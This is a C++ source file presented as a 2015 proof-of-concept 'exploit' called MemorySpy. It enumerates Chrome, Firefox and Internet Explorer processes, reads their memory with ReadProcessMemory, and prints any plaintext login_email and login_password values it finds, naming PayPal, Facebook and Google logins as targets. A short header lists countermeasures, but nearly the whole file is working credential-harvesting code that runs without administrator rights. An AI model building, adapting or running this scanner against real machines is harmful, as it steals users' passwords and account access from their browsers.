/*

MemorySpy - Exploit
(c) B. Blechschmidt (Ovex), 2015
http://Blechschmidt.Saarland

Process memory scanner for sensitive data (after SSL/TLS-encryption) on Windows.

Sites applicable for this proof of concept:
https://paypal.de
https://facebook.com
https://accounts.google.com
...

Usage:
1) Start the application (without administrator privileges) and open your browser.
	This step can also be undertaken after step three. There is a high probability that this step still works after closing the tab opened in step three.
2) Go to one of the above mentioned pages or adapt the exploit to more parameters.
3) Enter your login credentials and submit them to the server.
4) Watch the application output showing your credentials in plain text.

Countermeasures:
1) Memory protection: Disallow foreign processes to access the memory of the browser. Information: http://msdn.microsoft.com/en-us/library/windows/desktop/aa366785(v=vs.85).aspx and http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx
2) Overwrite sensitive information (sent through encrypted channels) immediately after submission.

*/

// Code compilation requires C++11-compiler flags to be enabled and the char-datatype to be unsigned by default (/J-compiler-option using the internal Visual Studio compiler)
// http://msdn.microsoft.com/en-us/library/0d294k5z.aspx
#include <cstdlib>
#include <iostream>
#include <vector>
#include <string>
#include <deque>
#include <map>
#include <limits>
#include <fstream>

#include <Windows.h>
#undef max
#include <TlHelp32.h>

#include "SearchAlgo.h"
#include "Paypal.h"

using namespace std;



class MemorySpy
{
private:

	bool hexChar(char Character, char &returnChar)
	{
		if (Character >= '0' && Character <= '9')
		{
			returnChar = Character - '0';
			return true;
		}
		else if (Character >= 'A' && Character <= 'F')
		{
			returnChar = Character - 'A';
			return true;
		}
		else  if (Character >= 'a' && Character <= 'f')
		{
			returnChar = Character - 'a';
			return true;
		}
		else
		{
			return false;
		}
	}

	char* urldecode(char* String)
	{
		size_t len = strlen(String) + 1;
		char* decoded = new char[len]();
		int decodedIndex = 0;
		for (int i = 0; String[i] != 0; i++)
		{
			char c1, c2;
			if (String[i] == '%' && hexChar(String[i + 1], c1) && hexChar(String[i + 2], c2))
			{
				decoded[decodedIndex++] = (c1 << 4) | c2;
				i += 2;
			}
			else
			{
				decoded[decodedIndex++] = String[i];
			}
		}
		return decoded;
	}

public:
	vector<char*> Processes;
	AhoCorasick<char>* SearchAlgo;
	unordered_set<char*> Results;
	MemorySpy()
	{
		Processes = { "chrome.exe", "firefox.exe", "iexplore.exe" }; //Only processes in lower case
		list<char*> Strings = {"login_email=", "login_password=" }; //Common HTTP parameter names
		SearchAlgo = new AhoCorasick<char>(Strings);
		#ifdef _DEBUG
			cout << "Search algorithm DFA:" << endl;
			SearchAlgo->NFAI->ToDFA()->Debug();
			cout << endl << endl;
		#endif
	}

	void strtolower(char* String)
	{
		for (int i = 0; String[i] != 0; i++)
		{
			if (String[i] >= 'A' && String[i] <= 'Z')
			{
				String[i] -= 'Z' - 'z';
			}
		}
	}

	char chartolower(char c)
	{
		if (c >= 'A' && c <= 'Z')
		{
			return c - ('Z' - 'z');
		}
		return c;
	}

	void wtoc(CHAR* Dest, const WCHAR* Source)
	{
		int i = 0;

		while (Source[i] != '\0')
		{
			Dest[i] = (CHAR)Source[i];
			++i;
		}
		Dest[i] = '\0';
	}

	void AllProcesses()
	{
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		if (Process32First(snapshot, &entry) == TRUE)
		{
			while (Process32Next(snapshot, &entry) == TRUE)
			{
				for (size_t i = 0; i < Processes.size(); i++)
				{
					char ProcessName[260];
					wtoc(ProcessName, entry.szExeFile);
					strtolower(ProcessName);
					if (strcmp(ProcessName, Processes[i]) == 0)
					{
						cout << "Scanning " << ProcessName << " (" << entry.th32ProcessID << ")" << " ..." << endl;
						ExtractRegion(entry.th32ProcessID);
						cout << "Scan of " << ProcessName << " (" << entry.th32ProcessID << ") complete." << endl << endl;
					}
				}

			}
		}

		CloseHandle(snapshot);
	}

	bool ExtractRegion(int ProcessId)
	{
		SYSTEM_INFO SystemInfo;
		GetSystemInfo(&SystemInfo);
		LPVOID StartAddress = SystemInfo.lpMinimumApplicationAddress;
		LPVOID EndAddress = SystemInfo.lpMaximumApplicationAddress;

		HANDLE ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId);

		MEMORY_BASIC_INFORMATION BasicMemoryInfo;

		while (StartAddress < EndAddress)
		{
			VirtualQueryEx(ProcessHandle, StartAddress, &BasicMemoryInfo, sizeof(MEMORY_BASIC_INFORMATION));
			if (BasicMemoryInfo.State == MEM_COMMIT)
			{
				char* Buffer = new char[BasicMemoryInfo.RegionSize];
				SIZE_T BytesRead = 0;
				ReadProcessMemory(ProcessHandle, BasicMemoryInfo.BaseAddress, Buffer, BasicMemoryInfo.RegionSize, &BytesRead);


				for (size_t i = 0; i < BytesRead; i++)
				{
					if (SearchAlgo->GoEdge(chartolower(Buffer[i])))
					{
						int len;
						i++;
						for (len = 0; !(Buffer[i + len] == '&' || Buffer[i + len] == '\0' || (Buffer[i + len] == ';' && Buffer[i + len + 1] == ' ') || Buffer[i+len] <= ' ' || Buffer[i+len] > 'z'); len++);
						char* Result = new char[len + 1];
						Result[len] = 0;
						memcpy(Result, &Buffer[i], len);
						Result = urldecode(Result);
						bool inResults = false;
						iter(Results)
						{
							if (strcmp(*it, Result) == 0)
							{
								inResults = true;
								break;
							}
						}
						if (!inResults)
						{
							cout << "Result: " << Result << endl;
							Results.insert(Result);
						}
						else
						{
							delete Result;
						}
						i += len;
					}

				}
				delete Buffer;

			}
			StartAddress = (LPVOID)((int)StartAddress + (int)BasicMemoryInfo.RegionSize);
		}

		return true;
	}
};

int main()
{
	MemorySpy Spy = MemorySpy();
	cout << "MemorySpy - Exploit (proof of concept)" << endl << "(c) B. Blechschmidt, 2015" << endl << endl << endl;

	cout << "Please make sure, nobody around you might have a glance at your sensitive information on screen." << endl << "Therefore confirm using [ENTER]." << endl;

	cin.get();

	cout << "Search continuously." << endl;
	while (true)
	{
		cout << "Start scanning..." << endl << endl;
		Spy.AllProcesses();
		cout << "All processes scanned." << endl << endl;
	}
}